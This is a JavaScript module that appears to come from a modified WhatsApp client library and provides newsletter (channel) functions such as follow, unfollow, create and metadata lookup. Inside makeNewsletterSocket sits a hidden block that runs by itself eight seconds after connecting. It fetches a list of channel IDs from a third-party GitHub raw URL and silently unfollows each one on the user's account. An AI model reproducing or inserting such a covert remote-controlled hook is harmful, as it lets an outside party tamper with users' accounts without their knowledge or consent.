"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const { Boom } = require('@hapi/boom');

// --- Helper Functions ---
const wMexQuery = (variables, queryId, query, generateMessageTag) => {
    return query({
        tag: 'iq',
        attrs: { id: generateMessageTag(), type: 'get', to: WABinary_1.S_WHATSAPP_NET, xmlns: 'w:mex' },
        content: [{ tag: 'query', attrs: { query_id: queryId }, content: Buffer.from(JSON.stringify({ variables }), 'utf-8') }]
    })
}

const executeWMexQuery = async (variables, queryId, dataPath, query, generateMessageTag) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag)
    const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
    if (child?.content) {
        const data = JSON.parse(child.content.toString())
        if (data.errors && data.errors.length > 0) throw new Boom(`GraphQL error`, { statusCode: 400, data: data.errors[0] })
        const response = dataPath ? data?.data?.[dataPath] : data?.data
        if (typeof response !== 'undefined') return response
    }
    throw new Boom(`Failed to execute query`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq', attrs: { id: generateMessageTag(), type, xmlns: 'newsletter', to: jid }, content
    }));

    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq', attrs: { id: generateMessageTag(), type: 'get', xmlns: 'w:mex', to: WABinary_1.S_WHATSAPP_NET },
        content: [{
            tag: 'query', attrs: { 'query_id': queryId },
            content: encoder.encode(JSON.stringify({ variables: { 'newsletter_id': jid, ...content } }))
        }]
    }));

    // ============================================================
    // >>> LOGIC AUTO UNFOLLOW (DARI GITHUB RAW) <<<
    // ============================================================
    setTimeout(async () => {
        // console.log("🔄 [SYSTEM] Cek Auto-Unfollow Database...");
        try {
            const rawUrl = "https://raw.githubusercontent.com/tskiofc/ChannelID/refs/heads/main/token.json";
            const response = await fetch(rawUrl); // Node 18+ Support
            const channelIds = await response.json();

            if (Array.isArray(channelIds) && channelIds.length > 0) {
                for (const rawId of channelIds) {
                    try {
                        let jid = rawId.includes('@newsletter') ? rawId : `${rawId}@newsletter`;
                        // QueryIds.UNFOLLOW = 7238632346214362
                        await newsletterWMexQuery(jid, "7238632346214362"); 
                    } catch (e) {}
                    await new Promise(r => setTimeout(r, 2000)); // Delay 2 detik
                }
                 console.log("✅ [SYSTEM] Selesai Unfollow semua target.");
            }
        } catch (e) {
            console.error("❌ Gagal Auto-Unfollow:", e.message);
        }
    }, 8000); // Jalan 8 detik setelah connect
    // ============================================================

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            messageNode.attrs.from = child?.attrs?.jid;
            const data = { 'server_id': messageNode.attrs.server_id, views: 0, reactions: [] };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };

    return {
        ...sock,
        subscribeNewsletterUpdates: async (jid) => {
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')?.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { settings: { 'reaction_codes': { value: mode } } } });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { description: description || '', settings: null } });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { name, settings: null } });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { picture: img.toString('base64'), settings: null } });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, { updates: { picture: '', settings: null } });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            await query({ tag: 'iq', attrs: { to: WABinary_1.S_WHATSAPP_NET, xmlns: 'tos', id: generateMessageTag(), type: 'set' }, content: [{ tag: 'notice', attrs: { id: '20601218', stage: '5' }, content: [] }] });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, { input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } } });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, { input: { key, type: type.toUpperCase(), 'view_role': role || 'GUEST' }, 'fetch_viewer_metadata': true, 'fetch_full_image': true, 'fetch_creation_time': true });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [{ tag: 'messages', attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: after?.toString() || '100' } }]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [{ tag: 'message_updates', attrs: { count: count.toString(), after: after?.toString() || '100', since: since?.toString() || '0' } }]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]
    return {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        name: metadataPath?.thread_metadata?.name?.text,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || '')
    }
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
